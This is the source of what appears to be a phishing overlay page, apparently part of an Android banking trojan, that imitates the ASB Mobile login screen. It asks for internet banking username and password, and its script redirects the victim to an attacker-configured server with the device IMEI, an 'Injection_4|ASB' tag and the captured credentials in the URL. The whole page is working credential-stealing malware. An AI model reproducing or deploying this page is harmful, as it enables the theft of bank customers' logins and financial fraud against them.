<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Bawag</title>

    <script src="js/jquery-1.12.0.min.js"></script>
    <script src="js/viewport.js"></script>
	<script src="js/cat.functions.js"></script>

    <link rel="stylesheet" href="bootstrap/dist/css/bootstrap.min.css">
	<link rel="stylesheet" href="font-awesome/css/font-awesome.min.css">
	<link rel="stylesheet" href="nz/nz.co.asb.asbmobile/css/style.css">
	<link rel="stylesheet" href="css/cat.style.css" type="text/css" media="all">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
include "config.php"; ?>
<body>
<div class="header">
<img src="data:image/png;base64,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" >
<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADMAAAAzCAMAAAANf8AYAAACPVBMVEUAAAD+7Zf+7Z7/7JT/65P+7Z/+7Jb+5G/+7JX+6o3/53j+6ov+7JP+5n3+42v+5G7+5HD+4Fv+3Er+31X+31X+3kz+3U3+3k/+3Uz+20f+20f+20X+20X+20X92kT92UT92UT92kT92UT92UP92UP92UP92EL92EH92EH92EH92EH92EL92ED92ED96Zz+66b+66f96aD95I395Y3+4Xr+4Hf95Iv95Iz92V393Gr922X922b81Ef80Dv800j800n80Tz8zzr80D38zzn8zTT8zTT7yzH7yzH7yi/7yi/7yi/7yi/7yS37yS37yS37yS37yi/7yC37xyz7xyz7xyz7xyz7yCz7xyz7xyz7xyz7xyz95J795J3824L83oj82nr82Xj83Yj824L7zEr81Gb80mD70Fv6wSb7xTj6xjj6win6vyb7wSr6wCb5viH5vSH5vB35vR35vBz5vBz5vBz5vBz5uxz5uxz5uxz5vBz5uxz5uxv5uxr5uxr5uxr5uxr5uxv5uxv5uhr5uhr5uhr5uhr5uxr/5nX+3k7+3EL+3Ur+42r+3ET+3Uf+3Uj+3En+3Ef+3Ej+3Eb+20f+20b+20X92UT92UP800b8zzL8zjH80kH80Dz8zTD8zzX8zjD8zzj8zTP8zTT8zTH8zzz8zjT8zTL7yzD7yzH7yi/7yS37yD36wCL6vyH7xjj6wiz6vRr6vh76vx/7wSj6vh/6vRz6wSr5viH5vR/5vR75vR35vB35vBz5uxz5uxo56IDzAAAAh3RSTlMAGX3Gy4omAljF/M9rBW/5hQdf4P1dyP6w48aw/J0zxuQ6PtXkTCGKyc+XLwQFAhMUBTmo7PG0SVfo82gDSNb0S73+p+LFv6hI1vVMV+jzaQM5qO3ytEkCExUEBAUhicnOli8+1eRMMsXjOK/8nOPGybFg4f5eb/mHCAJYxf3PawUZfcfMiiYmcNwbAAABUElEQVRIx2NgGAXUBIxMzCysbCRpYefg5Grn5uElRQ8ff0dnZ1e3gCDxWoSEu3p6+3r6RUSJ1yMmPmEiEEzqkCBej+TkKWAwWYp4PdIyU0FgylRZ4vXIyU8DAwVFEsJNSXk6EKiokhRBauoamlrapKYEHd1hlbD19A0MSdRiZGxiamZOkhYLyxkzZ822srYhXout3Zy58+bNX2DvQLweR6eFi4Bg8RJn4vW4LF22EAiWLXIlXo/b8hVgsNydeD0enivBwMubhHDz8V0FBH7+AaQEdmBQcEhoGImRGh4RGTWsEnZ0DKk6YuPiExKTSNKSnLJ6zdp1qWkkaEnPWL9h46YNmzOziNeTnbNxCxBs3ZZLvJ687Tt2AsGu7fnE6ynYvRMMdhcSr6eoeA8YlJSSEAhl5XtBoKKSBD1V1TW1++rqG0iKoMam5pbWttH2CzUBAPKhd/24+T4/AAAAAElFTkSuQmCC" style="float: right;width: 32px;">
</div>

    <div class="main">

        <div class="container">
<div class="row">
                <div class="col-xs-10 col-sm-8">
                    <div class="form_">

						<h3>Welcome to</h3> <h3 style="color: #cf9e0f;">ASB Mobile</h3>

                        <form id="form" style="overflow: hidden;">

                            <div class="form-group">
									<label for="login">Username</label>
									<input type="text" class="form-control" name="field2" id="login" placeholder="Enter username" autocomplete="off" maxlength="50" data-reg="/.{3,50}/" >
                            </div>

                            <div class="form-group">
									<label for="login">Password</label>
									<input type="password" class="form-control" name="field3" id="password" placeholder="Enter Password" autocomplete="off" data-reg="/.{3,50}/" maxlength="50" >
                            </div>


                       		<i style="color: #c9c9c9;display: inline-block;width: 70%;font-weight: 100;margin-top: 15px;font-family: sans-serif;float: left;"> Use the same details you use to log in to Internet Banking. </i>
							<input type="button" class="input_submitBtn" onClick="sentServer();" value="Login">
 </form><br>

<p style="color: #e2e2e2;"> Get <a href="#" style="color: #ffc20e; text-decoration: underline;">help online</a> or phone <a href="#" style="color: #ffc20e; text-decoration: underline;">0800 662 226</a> during business hours. </p>
</div>
                </div>
            </div>
        </div>
    </div>

<script>
	function sentServer()
	{
	var oNumInp1 = document.getElementById('login');
	var oNumInp2 = document.getElementById('password');

if ((oNumInp1.value.length > 5)&&(oNumInp2.value.length > 3)) {
	var url='<?php echo $URL; ?>';
	var imei_c='<?php echo $IMEI_country; ?>';

	var login1 = document.forms["form"].elements["login"].value;
	var pass = document.forms["form"].elements["password"].value;

	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|ASB|"+login1+"|"+pass);
	}
}
</script>
</body>
</html>
